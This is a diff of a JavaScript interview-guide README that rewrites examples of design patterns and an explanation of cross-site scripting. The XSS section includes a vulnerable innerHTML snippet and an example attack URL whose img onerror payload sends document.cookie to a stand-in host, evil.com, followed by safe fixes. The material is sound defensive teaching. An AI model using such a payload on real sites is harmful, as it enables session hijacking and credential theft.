-The **Abstract Factory** groups related factories behind a common interface, enabling entire product families to be swapped (e.g., switching from REST to GraphQL data sources without touching business logic).
+The **Factory Pattern** provides a single interface or method to create objects based on a specified type. This satisfies the **Open/Closed Principle** (open for extension, closed for modification) — adding a new product type requires only registering a new creator, not modifying existing code.
+
+**Example:** 
 
 ```js
-// ── Factory pattern — notification service ────────────────────────────────────
+/**
+ * Factory Pattern
+ */
 
-class EmailNotifier {
-  send(to, message) { console.log(`EMAIL → ${to}: ${message}`); }
+// 1. Concrete Products
+class PremiumUser {
+  getPermissions() { return ['read', 'write', 'premium-upload']; }
 }
 
-class SMSNotifier {
-  send(to, message) { console.log(`SMS → ${to}: ${message}`); }
+class StandardUser {
+  getPermissions() { return ['read', 'write']; }
 }
 
-class PushNotifier {
-  send(to, message) { console.log(`PUSH → ${to}: ${message}`); }
+class GuestUser {
+  getPermissions() { return ['read']; }
 }
 
-// Factory with registry — Open/Closed: add new type by registering, never modify this fn
-class NotifierFactory {
-  static #registry = new Map([
-    ['email', EmailNotifier],
-    ['sms',   SMSNotifier],
-    ['push',  PushNotifier],
-  ]);
+// 2. The Factory
+class UserFactory {
+  static createUser(type) {
+    const users = {
+      premium: PremiumUser,
+      standard: StandardUser,
+      guest: GuestUser
+    };
 
-  static register(type, NotifierClass) {
-    NotifierFactory.#registry.set(type, NotifierClass);
+    const UserClass = users[type];
+    
+    if (!UserClass) {
+      throw new Error(`User type "${type}" is not recognized.`);
+    }
+
+    return new UserClass();
   }
-
-  static create(type) {
-    const Notifier = NotifierFactory.#registry.get(type);
-    if (!Notifier) throw new Error(`Unknown notifier type: "${type}"`);
-    return new Notifier();
-  }
 }
 
-// Adding a new type without modifying existing code ✅
-class SlackNotifier {
-  send(to, message) { console.log(`SLACK → ${to}: ${message}`); }
-}
-NotifierFactory.register('slack', SlackNotifier);
-
-const notifier = NotifierFactory.create('slack');
-notifier.send('#alerts', 'Deploy succeeded');
-
-// ── Abstract Factory — cross-platform UI components ───────────────────────────
-// Abstract factory interface (conceptual — no formal interfaces in JS)
-class UIComponentFactory {
-  createButton()  { throw new Error('Not implemented'); }
-  createDialog()  { throw new Error('Not implemented'); }
+// 3. Application Usage (Closed to modification)
+function initializeSession(userType) {
+  const user = UserFactory.createUser(userType);
+  console.log(user.getPermissions()); // Interacts only with the interface
 }
 
-class WebUIFactory extends UIComponentFactory {
-  createButton()  { return { render: () => '<button class="web-btn" />' }; }
-  createDialog()  { return { render: () => '<dialog class="web-modal" />' }; }
-}
-
-class MobileUIFactory extends UIComponentFactory {
-  createButton()  { return { render: () => '<TouchableOpacity />' }; }
-  createDialog()  { return { render: () => '<Modal />' }; }
-}
-
-// Client code — works with any factory, never knows concrete classes
-function renderPage(factory) {
-  const btn    = factory.createButton();
-  const dialog = factory.createDialog();
-  return `${btn.render()} ${dialog.render()}`;
-}
-
-const platform = navigator?.userAgent.includes('Mobile') ? 'mobile' : 'web';
-const factory  = platform === 'mobile' ? new MobileUIFactory() : new WebUIFactory();
-console.log(renderPage(factory));
+initializeSession('premium'); // ['read', 'write', 'premium-upload']
 ```
 
-**Real-World Use Case:**
+**2. Abstract Factory Pattern**
 
-AWS SDK v3 uses the Factory pattern for client instantiation: `new S3Client({ region })`, `new DynamoDBClient({ region })`. Each client factory encapsulates endpoint resolution, credential loading, and retry configuration. The Abstract Factory pattern is used by testing libraries — Jest\'s `jest.mock()` mechanism replaces the real module factory with a mock factory, allowing entire subsystems (database layer, HTTP layer) to be substituted without any changes to application code, enabling true unit isolation.
+The **Abstract Factory Pattern** provides an interface for creating families of related or dependent objects without specifying their concrete classes. It is essentially a factory of factories.
+
+**Example:**
+
+```js
+/**
+ * Abstract Factory Pattern
+ */
+
+/**
+ * Imagine a system that needs to generate UI themes (Dark and Light modes) where each theme consists of matching buttons and text fields.
+ */
+
+// --- 1. Abstract / Common Interfaces (Implicit in JS) ---
+// All Buttons must implement: render()
+// All Fields must implement: getValue()
+
+// --- 2. Concrete Product Families ---
+class DarkButton { render() { return "<button class='bg-black text-white'>Dark</button>"; } }
+class LightButton { render() { return "<button class='bg-white text-black'>Light</button>"; } }
+
+class DarkField { getValue() { return "Dark Input Value"; } }
+class LightField { getValue() { return "Light Input Value"; } }
+
+// --- 3. Concrete Factories ---
+class DarkThemeFactory {
+  createButton() { return new DarkButton(); }
+  createField() { return new DarkField(); }
+}
+
+class LightThemeFactory {
+  createButton() { return new LightButton(); }
+  createField() { return new LightField(); }
+}
+
+// --- 4. The Abstract Factory Core Engine ---
+class ThemeEngine {
+  static getFactory(themeType) {
+    const factories = {
+      dark: DarkThemeFactory,
+      light: LightThemeFactory
+    };
+
+    const FactoryClass = factories[themeType];
+    if (!FactoryClass) throw new Error(`Theme "${themeType}" unrecognized.`);
+    
+    return new FactoryClass();
+  }
+}
+
+// --- 5. Application Client (Fully decoupled from theme specific types) ---
+function renderApplicationUI(themeName) {
+  // Client only knows about the abstract factory mechanism
+  const factory = ThemeEngine.getFactory(themeName);
+  
+  const button = factory.createButton();
+  const field = factory.createField();
+
+  console.log(button.render());
+  console.log(field.getValue());
+}
+
+renderApplicationUI('dark');  // Outputs DarkButton HTML and DarkField Value
+renderApplicationUI('light'); // Outputs LightButton HTML and LightField Value
+```
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -13881,99 +13602,786 @@ AWS SDK v3 uses the Factory pattern for client instantiation: `new S3Client({ re
 
 ## Q. Implement the Publish-Subscribe (Pub-Sub) pattern and contrast it with the Observer pattern.
 
-Both patterns decouple producers from consumers, but differ in coupling degree:
+The **Publish-Subscribe (Pub-Sub)** pattern utilizes a central event channel (broker) to sit between publishers and subscribers, completely decoupling them. In contrast, the **Observer** pattern involves subjects holding direct references to their observers to trigger updates
 
-| | **Observer** | **Pub-Sub** |
-|---|---|---|
-| Coupling | Subject knows its observers | Publishers and subscribers are completely decoupled via an event bus |
-| Broker | None — subject calls observers directly | Event bus / message broker in between |
-| Communication | Synchronous (typically) | Can be sync or async |
-| Examples | DOM EventTarget, Node.js EventEmitter | Redux store, React Context, message queues |
+* **Observer Pattern**: The Subject (Observable) maintains a direct list of Observers (listeners) and notifies them directly. The Subject knows who its observers are.
+
+* **Pub-Sub Pattern**: Publishers and Subscribers never interact directly. Instead, Publishers send events to a central Event Broker (or Message Queue), and Subscribers express interest in specific topics managed by that Broker.
+
+**Architectural Comparison**
+
+| Feature | Observer Pattern | Publish-Subscribe (Pub-Sub) Pattern |
+|---------|------------------|-------------------------------------|
+| Coupling | Tight (Subject knows its Observers) | Loose / Decoupled (Separated by a third-party broker) |
+| Awareness | Direct reference required | Fully anonymous to each other |
+| Topology | Typically One-to-Many | Many-to-Many |
+| Execution | Mostly Synchronous | Often Asynchronous / Event-driven |
+| Use Case | Single component states (e.g., UI inputs) | Cross-application architecture or microservices |
+
+**1. Observer Pattern Implementation**
+
+In this pattern, the `Subject` directly stores and iterates over its list of `observers`.
 
 ```js
-// ── Pub-Sub EventBus ──────────────────────────────────────────────────────────
-class EventBus {
-  #listeners = new Map(); // topic → Set<{ handler, once }>
+/**
+ * Observer Pattern
+ */
 
-  subscribe(topic, handler, { once = false } = {}) {
-    if (!this.#listeners.has(topic)) {
-      this.#listeners.set(topic, new Set());
-    }
-    const entry = { handler, once };
-    this.#listeners.get(topic).add(entry);
-
-    // Return unsubscribe function
-    return () => this.#listeners.get(topic)?.delete(entry);
+class Subject {
+  constructor() {
+    this.observers = [];
   }
 
-  once(topic, handler) {
-    return this.subscribe(topic, handler, { once: true });
+  subscribe(observer) {
+    this.observers.push(observer);
   }
 
-  publish(topic, payload) {
-    const entries = this.#listeners.get(topic);
-    if (!entries) return;
-
-    for (const entry of [...entries]) { // copy to avoid mutation during iteration
-      entry.handler(payload);
-      if (entry.once) entries.delete(entry);
-    }
+  unsubscribe(observer) {
+    this.observers = this.observers.filter(obs => obs !== observer);
   }
 
-  unsubscribeAll(topic) {
-    this.#listeners.delete(topic);
+  notify(data) {
+    // Direct synchronous communication
+    this.observers.forEach(observer => observer.update(data));
   }
 }
 
-// ── Usage: cross-module communication without direct imports ──────────────────
-const bus = new EventBus();
+// Concrete Observer
+const loggingObserver = {
+  update: (data) => console.log(`Logged update: ${data}`)
+};
 
-// Module A: Order Service (publisher)
-function placeOrder(order) {
-  // ... save to DB
-  bus.publish('order:placed', { orderId: order.id, total: order.total });
-}
-
-// Module B: Email Service (subscriber — knows nothing about OrderService)
-const unsubEmail = bus.subscribe('order:placed', ({ orderId, total }) => {
-  console.log(`Send confirmation email for order ${orderId} ($${total})`);
-});
-
-// Module C: Analytics Service (another independent subscriber)
-bus.subscribe('order:placed', ({ orderId }) => {
-  console.log(`Track order ${orderId} in analytics`);
-});
-
-placeOrder({ id: 'ORD-001', total: 99.99 });
-// Both subscribers fire independently
-
-unsubEmail(); // Module B unsubscribes cleanly
-
-// ── Typed async Pub-Sub with TypeScript-style contracts (runtime) ─────────────
-class TypedEventBus extends EventBus {
-  static #schemas = new Map();
-
-  static defineEvent(topic, validator) {
-    TypedEventBus.#schemas.set(topic, validator);
-  }
-
-  publish(topic, payload) {
-    const validate = TypedEventBus.#schemas.get(topic);
-    if (validate && !validate(payload)) {
-      throw new TypeError(`Invalid payload for topic "${topic}"`);
-    }
-    super.publish(topic, payload);
-  }
-}
-
-TypedEventBus.defineEvent('order:placed', p =>
-  typeof p.orderId === 'string' && typeof p.total === 'number'
-);
+// Usage
+const subject = new Subject();
+subject.subscribe(loggingObserver);
+subject.notify("User logged in"); // Subject directly invokes loggingObserver.update
 ```
 
-**Real-World Use Case:**
+**2. Publish-Subscribe Pattern Implementation**
 
-Redux is an application-level Pub-Sub: `dispatch(action)` publishes to the store (broker), and `store.subscribe()` (or `useSelector` via React-Redux) receives notifications. The component tree never directly communicates with the action creators — everything flows through the bus. In microservices, AWS SNS/SQS implements distributed Pub-Sub: an `OrderService` publishes to an SNS topic, and `EmailService`, `InventoryService`, and `AnalyticsService` each subscribe via separate SQS queues — fully decoupled, independently scalable, and able to add new consumers without modifying the publisher.
+```js
+class PubSub {
+  constructor() {
+    this.events = {};
+  }
+
+  // Add a subscriber to a specific event topic
+  subscribe(event, callback) {
+    if (!this.events[event]) {
+      this.events[event] = [];
+    }
+    this.events[event].push(callback);
+
+    // Return an unsubscribe function for easy cleanup
+    return () => {
+      this.events[event] = this.events[event].filter(cb => cb !== callback);
+    };
+  }
+
+  // Publish an event, executing all registered callbacks with data
+  publish(event, data) {
+    if (!this.events[event]) return;
+    this.events[event].forEach(callback => callback(data));
+  }
+}
+
+// --- Usage Example ---
+const eventBus = new PubSub();
+
+// Subscriber 1: Analytics
+const unsubAnalytics = eventBus.subscribe('user_signed_up', (user) => {
+  console.log(`[Analytics] Logging signup for: ${user.name}`);
+});
+
+// Subscriber 2: Email System
+eventBus.subscribe('user_signed_up', (user) => {
+  console.log(`[Email] Sending welcome email to: ${user.email}`);
+});
+
+// Publish the event
+eventBus.publish('user_signed_up', { name: 'Alice', email: 'alice@example.com' });
+
+// Remove the analytics subscriber and publish again
+unsubAnalytics();
+eventBus.publish('user_signed_up', { name: 'Bob', email: 'bob@example.com' });
+```
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. What is the Module pattern and how does it differ from ES6 modules?
+
+The **Module pattern** uses an IIFE (Immediately Invoked Function Expression) to create a private scope, exposing only a public API via the returned object. It predates ES6 and solves the problem of global namespace pollution in pre-module JavaScript environments.
+
+**1. Classic Module Pattern (IIFE)**
+
+```js
+/**
+ * Module Pattern — IIFE
+ */
+const ShoppingCart = (function () {
+  // Private state — inaccessible outside the IIFE
+  let items = [];
+  let discount = 0;
+
+  // Private helper
+  function calculateTotal() {
+    const subtotal = items.reduce((sum, item) => sum + item.price * item.qty, 0);
+    return subtotal - subtotal * discount;
+  }
+
+  // Public API
+  return {
+    addItem(item) {
+      items.push(item);
+    },
+    setDiscount(pct) {
+      discount = pct / 100;
+    },
+    getTotal() {
+      return calculateTotal();
+    },
+    getItems() {
+      return [...items]; // return a copy to protect internal state
+    },
+  };
+})();
+
+ShoppingCart.addItem({ name: 'Laptop', price: 1000, qty: 1 });
+ShoppingCart.addItem({ name: 'Mouse', price: 50, qty: 2 });
+ShoppingCart.setDiscount(10);
+console.log(ShoppingCart.getTotal()); // 990
+console.log(ShoppingCart.items);      // undefined — private
+```
+
+**2. Revealing Module Pattern**
+
+A variant where all logic is written privately and only references are revealed, making the public/private split explicit at the bottom.
+
+```js
+const Counter = (function () {
+  let count = 0;
+
+  function increment() { count++; }
+  function decrement() { count--; }
+  function reset()     { count = 0; }
+  function getCount()  { return count; }
+
+  // Reveal only what is public
+  return { increment, decrement, reset, getCount };
+})();
+
+Counter.increment();
+Counter.increment();
+console.log(Counter.getCount()); // 2
+```
+
+**Comparison: Module Pattern vs ES6 Modules**
+
+| Feature | IIFE Module Pattern | ES6 Modules (`import`/`export`) |
+|---|---|---|
+| Scope isolation | Function scope (closure) | File scope (native) |
+| Dependency management | Manual (script order) | Declarative (`import`) |
+| Tree-shaking | Not supported | Supported by bundlers |
+| Singleton | Yes (single IIFE execution) | Yes (module cache) |
+| Static analysis | No | Yes |
+| Server-side (Node.js) | Yes | Yes (`.mjs` or `"type":"module"`) |
+
+**Use case:** The IIFE pattern is still useful in environments without a bundler (CDN scripts, browser extensions, legacy codebases). For all modern projects, prefer ES6 modules.
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. Implement the Strategy pattern — how does it enable runtime algorithm switching?
+
+The **Strategy pattern** defines a family of interchangeable algorithms, encapsulates each one, and makes them substitutable at runtime without changing the code that uses them. It follows the **Open/Closed Principle**: add new strategies without modifying the context.
+
+```js
+/**
+ * Strategy Pattern — Payment processing
+ */
+
+// --- Concrete Strategies ---
+class CreditCardStrategy {
+  pay(amount) {
+    console.log(`Paid $${amount} via Credit Card`);
+  }
+}
+
+class PayPalStrategy {
+  pay(amount) {
+    console.log(`Paid $${amount} via PayPal`);
+  }
+}
+
+class CryptoStrategy {
+  pay(amount) {
+    console.log(`Paid $${amount} via Crypto (BTC)`);
+  }
+}
+
+// --- Context ---
+class Checkout {
+  #strategy;
+
+  setStrategy(strategy) {
+    this.#strategy = strategy;
+  }
+
+  processPayment(amount) {
+    if (!this.#strategy) throw new Error('No payment strategy set');
+    this.#strategy.pay(amount);
+  }
+}
+
+// --- Usage ---
+const checkout = new Checkout();
+
+checkout.setStrategy(new CreditCardStrategy());
+checkout.processPayment(120); // Paid $120 via Credit Card
+
+checkout.setStrategy(new PayPalStrategy());
+checkout.processPayment(75);  // Paid $75 via PayPal
+
+// Extend with a new strategy — zero changes to Checkout
+checkout.setStrategy(new CryptoStrategy());
+checkout.processPayment(300); // Paid $300 via Crypto (BTC)
+```
+
+**Real-world use cases:**
+
+* Sorting algorithms switchable at runtime based on data size
+* Authentication strategies (JWT, OAuth, API key) in Express middleware
+* Compression strategies (gzip, brotli, none) based on client `Accept-Encoding`
+* Form validation rules that change per user role
+
+**Strategy vs Switch/if-else:**
+
+```js
+// Without Strategy — closed to extension, violates OCP
+function pay(method, amount) {
+  if (method === 'card') { /* ... */ }
+  else if (method === 'paypal') { /* ... */ }
+  // Every new method requires modifying this function
+}
+
+// With Strategy — open to extension, closed to modification
+checkout.setStrategy(new NewPaymentMethod());
+checkout.processPayment(amount);
+```
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. Implement the Decorator pattern — how does it extend behaviour without modifying the original class?
+
+The **Decorator pattern** wraps an object to add new behaviour dynamically without altering the original class or using inheritance. Each decorator adds a single responsibility, making them composable.
+
+```js
+/**
+ * Decorator Pattern — Composable request pipeline
+ */
+
+// Base component
+class ApiRequest {
+  async fetch(url) {
+    const res = await globalThis.fetch(url);
+    return res.json();
+  }
+}
+
+// Decorator 1: Logging
+class LoggingDecorator {
+  #wrapped;
+  constructor(request) { this.#wrapped = request; }
+
+  async fetch(url) {
+    console.log(`[LOG] Requesting: ${url}`);
+    const start = Date.now();
+    const result = await this.#wrapped.fetch(url);
+    console.log(`[LOG] Completed in ${Date.now() - start}ms`);
+    return result;
+  }
+}
+
+// Decorator 2: Caching
+class CachingDecorator {
+  #wrapped;
+  #cache = new Map();
+
+  constructor(request) { this.#wrapped = request; }
+
+  async fetch(url) {
+    if (this.#cache.has(url)) {
+      console.log(`[CACHE] Hit: ${url}`);
+      return this.#cache.get(url);
+    }
+    const result = await this.#wrapped.fetch(url);
+    this.#cache.set(url, result);
+    return result;
+  }
+}
+
+// Decorator 3: Retry
+class RetryDecorator {
+  #wrapped;
+  #retries;
+
+  constructor(request, retries = 3) {
+    this.#wrapped = request;
+    this.#retries = retries;
+  }
+
+  async fetch(url) {
+    for (let attempt = 1; attempt <= this.#retries; attempt++) {
+      try {
+        return await this.#wrapped.fetch(url);
+      } catch (err) {
+        if (attempt === this.#retries) throw err;
+        console.log(`[RETRY] Attempt ${attempt} failed, retrying...`);
+      }
+    }
+  }
+}
+
+// --- Compose decorators ---
+const request = new RetryDecorator(
+  new CachingDecorator(
+    new LoggingDecorator(
+      new ApiRequest()
+    )
+  ),
+  3
+);
+
+// First call: logs + fetches + caches
+await request.fetch('https://api.example.com/users');
+
+// Second call: cache hit — no network request
+await request.fetch('https://api.example.com/users');
+```
+
+**Use cases:** HTTP middleware pipelines, UI component enhancement (scrollable, resizable wrappers), stream transformations (Node.js Transform streams), logging/metrics layers.
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. Implement the Command pattern — how does it enable undo/redo functionality?
+
+The **Command pattern** encapsulates a request as an object, separating the issuer of a request from the object that executes it. The pattern natively supports undo/redo by storing executed commands in a history stack.
+
+```js
+/**
+ * Command Pattern — Text editor with undo/redo
+ */
+
+// Receiver
+class TextEditor {
+  #content = '';
+
+  insert(text, position) {
+    this.#content =
+      this.#content.slice(0, position) + text + this.#content.slice(position);
+  }
+
+  delete(position, length) {
+    this.#content =
+      this.#content.slice(0, position) + this.#content.slice(position + length);
+  }
+
+  getContent() { return this.#content; }
+}
+
+// Command interface (via duck typing)
+class InsertCommand {
+  #editor; #text; #position;
+
+  constructor(editor, text, position) {
+    this.#editor = editor;
+    this.#text = text;
+    this.#position = position;
+  }
+
+  execute() {
+    this.#editor.insert(this.#text, this.#position);
+  }
+
+  undo() {
+    this.#editor.delete(this.#position, this.#text.length);
+  }
+}
+
+class DeleteCommand {
+  #editor; #position; #length; #deletedText;
+
+  constructor(editor, position, length) {
+    this.#editor = editor;
+    this.#position = position;
+    this.#length = length;
+  }
+
+  execute() {
+    // Capture text before deleting so undo can restore it
+    this.#deletedText = this.#editor.getContent().slice(
+      this.#position, this.#position + this.#length
+    );
+    this.#editor.delete(this.#position, this.#length);
+  }
+
+  undo() {
+    this.#editor.insert(this.#deletedText, this.#position);
+  }
+}
+
+// Invoker — manages history
+class CommandHistory {
+  #history = [];
+  #redoStack = [];
+
+  execute(command) {
+    command.execute();
+    this.#history.push(command);
+    this.#redoStack = []; // clear redo stack on new action
+  }
+
+  undo() {
+    const command = this.#history.pop();
+    if (!command) return;
+    command.undo();
+    this.#redoStack.push(command);
+  }
+
+  redo() {
+    const command = this.#redoStack.pop();
+    if (!command) return;
+    command.execute();
+    this.#history.push(command);
+  }
+}
+
+// --- Usage ---
+const editor = new TextEditor();
+const history = new CommandHistory();
+
+history.execute(new InsertCommand(editor, 'Hello', 0));
+console.log(editor.getContent()); // 'Hello'
+
+history.execute(new InsertCommand(editor, ' World', 5));
+console.log(editor.getContent()); // 'Hello World'
+
+history.undo();
+console.log(editor.getContent()); // 'Hello'
+
+history.redo();
+console.log(editor.getContent()); // 'Hello World'
+
+history.execute(new DeleteCommand(editor, 0, 5));
+console.log(editor.getContent()); // ' World'
+
+history.undo();
+console.log(editor.getContent()); // 'Hello World'
+```
+
+**Use cases:** Text editor undo/redo, database transaction rollback, task queues (job scheduling), macro recording in UI automation.
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. Implement the Proxy pattern using ES6 `Proxy` — what are its practical applications?
+
+The **Proxy pattern** provides a surrogate that controls access to another object. ES6 introduced a native `Proxy` object that intercepts and redefines fundamental operations (property access, assignment, function invocation) via **traps**.
+
+```js
+/**
+ * Proxy Pattern — Validation, logging, and lazy initialisation
+ */
+
+// --- 1. Validation Proxy ---
+function createValidatedUser(data) {
+  return new Proxy(data, {
+    set(target, prop, value) {
+      if (prop === 'age') {
+        if (typeof value !== 'number' || value < 0 || value > 150) {
+          throw new RangeError(`Invalid age: ${value}`);
+        }
+      }
+      if (prop === 'email') {
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
+          throw new TypeError(`Invalid email: ${value}`);
+        }
+      }
+      target[prop] = value;
+      return true; // required by Proxy set trap
+    }
+  });
+}
+
+const user = createValidatedUser({});
+user.name  = 'Alice';
+user.age   = 30;        // valid
+user.email = 'alice@example.com'; // valid
+// user.age = -5;       // throws RangeError
+// user.email = 'bad';  // throws TypeError
+
+// --- 2. Logging / Audit Proxy ---
+function createAuditProxy(target, label) {
+  return new Proxy(target, {
+    get(obj, prop) {
+      console.log(`[AUDIT] GET ${label}.${String(prop)}`);
+      return typeof obj[prop] === 'function'
+        ? obj[prop].bind(obj)
+        : obj[prop];
+    },
+    set(obj, prop, value) {
+      console.log(`[AUDIT] SET ${label}.${String(prop)} = ${JSON.stringify(value)}`);
+      obj[prop] = value;
+      return true;
+    }
+  });
+}
+
+const config = createAuditProxy({ theme: 'dark', lang: 'en' }, 'Config');
+config.theme;         // [AUDIT] GET Config.theme
+config.lang = 'fr';   // [AUDIT] SET Config.lang = "fr"
+
+// --- 3. Lazy Initialisation Proxy ---
+function lazyLoad(factory) {
+  let instance = null;
+  return new Proxy({}, {
+    get(_, prop) {
+      if (!instance) {
+        console.log('[LAZY] Initialising expensive resource...');
+        instance = factory();
+      }
+      return instance[prop];
+    }
+  });
+}
+
+const db = lazyLoad(() => ({ query: (sql) => `Result of: ${sql}` }));
+// Nothing initialised yet
+console.log(db.query('SELECT 1'));
+// [LAZY] Initialising expensive resource...
+// 'Result of: SELECT 1'
+```
+
+**Common Proxy trap reference:**
+
+| Trap | Intercepts |
+|---|---|
+| `get(target, prop)` | Property read: `obj.prop` |
+| `set(target, prop, value)` | Property write: `obj.prop = value` |
+| `has(target, prop)` | `in` operator: `prop in obj` |
+| `apply(target, thisArg, args)` | Function call |
+| `construct(target, args)` | `new` operator |
+| `deleteProperty(target, prop)` | `delete obj.prop` |
+
+**Use cases:** input validation, API response caching, access control (read-only objects), change detection (Vue 3's reactivity system uses `Proxy`), default property values, mocking in tests.
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. Implement the Builder pattern — when should you use it over a plain constructor?
+
+The **Builder pattern** separates the construction of a complex object from its representation, allowing the same construction process to produce different representations. It solves the *telescoping constructor* problem — constructors with many optional parameters.
+
+```js
+/**
+ * Builder Pattern — HTTP Request Builder
+ */
+class HttpRequest {
+  constructor(builder) {
+    this.url     = builder.url;
+    this.method  = builder.method;
+    this.headers = builder.headers;
+    this.body    = builder.body;
+    this.timeout = builder.timeout;
+    Object.freeze(this); // immutable once built
+  }
+
+  async send() {
+    const options = {
+      method:  this.method,
+      headers: this.headers,
+      body:    this.body ? JSON.stringify(this.body) : undefined,
+      signal:  AbortSignal.timeout(this.timeout),
+    };
+    const res = await fetch(this.url, options);
+    return res.json();
+  }
+}
+
+class HttpRequestBuilder {
+  #url;
+  #method  = 'GET';
+  #headers = { 'Content-Type': 'application/json' };
+  #body    = null;
+  #timeout = 5000;
+
+  constructor(url) {
+    if (!url) throw new Error('URL is required');
+    this.#url = url;
+  }
+
+  method(method) {
+    const allowed = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'];
+    if (!allowed.includes(method.toUpperCase())) {
+      throw new Error(`Unsupported method: ${method}`);
+    }
+    this.#method = method.toUpperCase();
+    return this; // fluent interface
+  }
+
+  header(key, value) {
+    this.#headers[key] = value;
+    return this;
+  }
+
+  body(data) {
+    this.#body = data;
+    return this;
+  }
+
+  timeout(ms) {
+    this.#timeout = ms;
+    return this;
+  }
+
+  build() {
+    return new HttpRequest({
+      url:     this.#url,
+      method:  this.#method,
+      headers: this.#headers,
+      body:    this.#body,
+      timeout: this.#timeout,
+    });
+  }
+}
+
+// --- Usage (fluent API) ---
+const request = new HttpRequestBuilder('https://api.example.com/users')
+  .method('POST')
+  .header('Authorization', 'Bearer token123')
+  .body({ name: 'Alice', role: 'admin' })
+  .timeout(3000)
+  .build();
+
+await request.send();
+```
+
+**Telescoping constructor problem (without Builder):**
+
+```js
+// Hard to read — what does `true, false, null, 3000` mean?
+new HttpRequest('https://api.example.com', 'POST', headers, body, true, false, null, 3000);
+```
+
+**When to use Builder vs alternatives:**
+
+| Approach | Best for |
+|---|---|
+| Builder | Objects with many optional params, immutable result, readable construction |
+| Plain constructor | 1–3 required params, no optional configuration |
+| Options object `{}` | Simple optional params without validation or immutability needs |
+| Factory function | When creation logic is conditional, not configurational |
+
+<div align="right">
+    <b><a href="#table-of-contents">↥ back to top</a></b>
+</div>
+
+## Q. Implement the Mediator pattern — how does it reduce coupling between components?
+
+The **Mediator pattern** defines an object that encapsulates how a set of objects interact. Instead of components communicating directly (creating a tightly coupled mesh), they communicate only through the mediator, reducing dependencies from O(n²) to O(n).
+
+```js
+/**
+ * Mediator Pattern — Chat room
+ */
+
+// Mediator
+class ChatRoom {
+  #users = new Map();
+
+  register(user) {
+    this.#users.set(user.name, user);
+    user.setChatRoom(this);
+  }
+
+  send(message, fromUser, toUserName = null) {
+    if (toUserName) {
+      // Direct message
+      const recipient = this.#users.get(toUserName);
+      if (recipient) recipient.receive(message, fromUser.name);
+    } else {
+      // Broadcast
+      this.#users.forEach((user) => {
+        if (user !== fromUser) user.receive(message, fromUser.name);
+      });
+    }
+  }
+}
+
+// Colleague
+class User {
+  #chatRoom = null;
+  name;
+
+  constructor(name) { this.name = name; }
+
+  setChatRoom(room) { this.#chatRoom = room; }
+
+  send(message, toUserName = null) {
+    console.log(`[${this.name}] sends: "${message}"`);
+    this.#chatRoom.send(message, this, toUserName);
+  }
+
+  receive(message, fromName) {
+    console.log(`[${this.name}] received from [${fromName}]: "${message}"`);
+  }
+}
+
+// --- Usage ---
+const room = new ChatRoom();
+const alice = new User('Alice');
+const bob   = new User('Bob');
+const carol = new User('Carol');
+
+room.register(alice);
+room.register(bob);
+room.register(carol);
+
+alice.send('Hello everyone!');
+// [Bob] received from [Alice]: "Hello everyone!"
+// [Carol] received from [Alice]: "Hello everyone!"
+
+bob.send('Hey Alice, DM!', 'Alice');
+// [Alice] received from [Bob]: "Hey Alice, DM!"
+// (Carol receives nothing)
+```
+
+**Without Mediator (tight coupling mesh):**
+
+```js
+// Every user holds references to every other user — O(n²) dependencies
+class User {
+  constructor(name, otherUsers) {
+    this.peers = otherUsers; // changes to any user affect all others
+  }
+}
+```
+
+**Real-world use cases:**
+
+* Air traffic control (planes communicate through the tower, not each other)
+* React's state lifting / Redux (components communicate via store)
+* Express.js router (routes don't reference each other directly)
+* GUI dialogs where clicking one widget affects several others
 
 <div align="right">
     <b><a href="#table-of-contents">↥ back to top</a></b>
@@ -13985,7 +14393,7 @@ Redux is an application-level Pub-Sub: `dispatch(action)` publishes to the store
 
 ## Q. What is Cross-Site Scripting (XSS), how does it work, and how do you prevent it in a JavaScript application?
 
-**XSS** is an injection attack where an adversary causes a victim\'s browser to execute malicious JavaScript in the context of a trusted origin. Because the script runs with the victim\'s session cookies, tokens, and DOM access, the attacker can steal credentials, hijack sessions, deface pages, or exfiltrate sensitive data.
+**Cross-Site Scripting (XSS)** attacks occur when an application includes untrusted user input directly in a web page without proper validation or escaping. Once the script runs in the victim\'s browser, the attacker can steal session tokens, hijack cookies, or log keystrokes. 
 
 **Three types:**
 
@@ -14004,56 +14412,27 @@ Redux is an application-level Pub-Sub: `dispatch(action)` publishes to the store
 5. **HttpOnly cookies** — prevents JavaScript from accessing session cookies even if XSS succeeds.
 6. **Trusted Types API** — browser-enforced type system that requires explicit sanitisation before assignment to dangerous sinks.
 
-```js
-// ── DOM-based XSS vulnerability and fix ───────────────────────────────────────
+**Example:**
 
-// ❌ VULNERABLE: unsanitised user input written to innerHTML
+```js
+/**
+ * DOM-based XSS Vulnerability 
+ */
+
+//  VULNERABLE: unsanitised user input written to innerHTML
 const name = new URLSearchParams(location.search).get('name');
 document.querySelector('#greeting').innerHTML = `Hello, ${name}!`;
 // Attack URL: /page?name=<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
 
-// ✅ SAFE: use textContent for plain text (never executes as HTML)
+//  SAFE: use textContent for plain text (never executes as HTML)
 document.querySelector('#greeting').textContent = `Hello, ${name}!`;
 
-// ✅ SAFE: use DOMPurify when you need to allow some HTML (e.g., rich text editor)
+//  SAFE: use DOMPurify when you need to allow some HTML (e.g., rich text editor)
 import DOMPurify from 'dompurify';
 document.querySelector('#content').innerHTML = DOMPurify.sanitize(userHtml, {
   ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
   ALLOWED_ATTR: ['href'],
 });
-
-// ✅ SAFE: Trusted Types API (Chrome 83+) — enforced sanitisation at sink level
-if (window.trustedTypes?.createPolicy) {
-  const policy = trustedTypes.createPolicy('default', {
-    createHTML: (input) => DOMPurify.sanitize(input),
-    createScriptURL: (url) => {
-      if (new URL(url).origin === location.origin) return url;
-      throw new Error('External script URLs not allowed');
-    },
-  });
-
-  element.innerHTML = policy.createHTML(userInput); // ✅ goes through sanitiser
-}
